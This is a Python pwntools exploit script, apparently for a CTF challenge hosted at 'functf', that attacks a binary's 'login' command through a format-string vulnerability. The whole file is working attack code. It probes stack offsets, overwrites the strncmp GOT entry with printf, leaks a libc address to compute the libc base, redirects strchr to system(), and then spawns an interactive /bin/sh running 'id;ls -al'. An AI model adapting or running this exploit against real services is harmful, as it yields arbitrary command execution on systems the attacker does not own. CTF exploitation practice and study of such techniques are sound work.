from pwn import *

# pwntools fms is default setting is 32bit
context.clear(arch='amd64')
if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
    os.system("echo "+str(p.pid)+ " > pid")
    pause()
elif sys.argv[1]=="3":
    #context.log_level='debug'
    p=remote("functf",18017)

buf=p.recvuntil("$")
print buf
p.sendline("username aaaa")

buf=p.recvuntil("$")
print buf

# find the offset
def fms_pre(n):
    log.info("fms_pre")
    payload=""
    payload+="%%%d$p"%n
    payload+="("+str(n)+")"
    payload+="A"*(0x82-len(payload))
    payload+=p64(0x0101010101010101)
    payload+=p64(0x2222222222222222)
    payload+=p64(0x0102030405060702)
    payload+=p64(0x3333333333333333)
    payload+=p64(0x0102030405060703)
    payload+=p64(0x0102030405060704)
    payload+=p64(0x0102030405060705)
    payload+=p64(0x0102030405060706)
    p.sendline("login "+payload)

# find the offset dummy, for checking only
def pre_check():
    for n in range(1,100):
        fms_pre(n)

# pwntools fms function, 64bit usage : blind
def fms(n,target_addr,src_value):
    log.info("fms")
    fms_buf=fmtstr_payload(n, {target_addr: src_value}, write_size='byte')
    print hexdump(fms_buf)
    payload=""
    payload+='a'*(0x40-0x33+0x16)
    payload+=fms_buf[0x40:]
    payload+="A"*(0x82-len(payload))
    payload+=fms_buf[:0x40]
    p.sendline("login "+payload)

# pwntools fms function, 64bit usage : not blind
def fms_show(n,target_addr,src_value):
    log.info("fms_show")
    fms_buf=fmtstr_payload(n, {target_addr: src_value}, write_size='byte')
    print hexdump(fms_buf)
    payload=""
    payload+='a'*(0x40-6)
    payload+=fms_buf[0x40:]
    payload+="B"*(0xa2-len(payload))
    payload+=fms_buf[:0x40]
    p.sendline("login "+payload)

#pre_check()
#pause()
# strncmp_got -> printf_plt + 6
# after that
# strncmp function will be a printf fuction
strncmp_got=0x602018
printf_pltjmp=0x400816
fms(30,strncmp_got,printf_pltjmp)

# find a good offset, for checking and leak
def fms_pre_show(n):
    buf=p.recvuntil("[final1] $")
    print buf
    payload=""
    payload+="%%%d$p"%n
    payload+="("+str(n)+")"
    payload+="B"*(0xa0-len(payload))
    payload+=p64(0x0101010101010101)
    payload+=p64(0x2222222222222222)
    payload+=p64(0x0102030405060702)
    payload+=p64(0x3333333333333333)
    payload+=p64(0x0102030405060703)
    payload+=p64(0x0102030405060704)
    payload+=p64(0x0102030405060705)
    payload+=p64(0x0102030405060706)
    p.sendline(payload)

# not used
#for n in range(1,100):
#    fms_pre_show(n)

# find a libc address, get offset, then get libc_base
n=96
fms_pre_show(n)
buf=p.recvuntil("(96)")
print buf

libc1=int(buf[-14-4:-4],16)
libc_base=libc1- 0x3d73e0
print 'libc1=',hex(libc1)
print 'libc_base=',hex(libc_base)

libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_system=libc_base + libc_elf.sym["system"]


# strchr -> system()
strchr_got = 0x602040
fms_show(29,strchr_got,libc_system)

p.sendline("/bin/sh")

p.sendline("id;ls -al")

p.interactive()
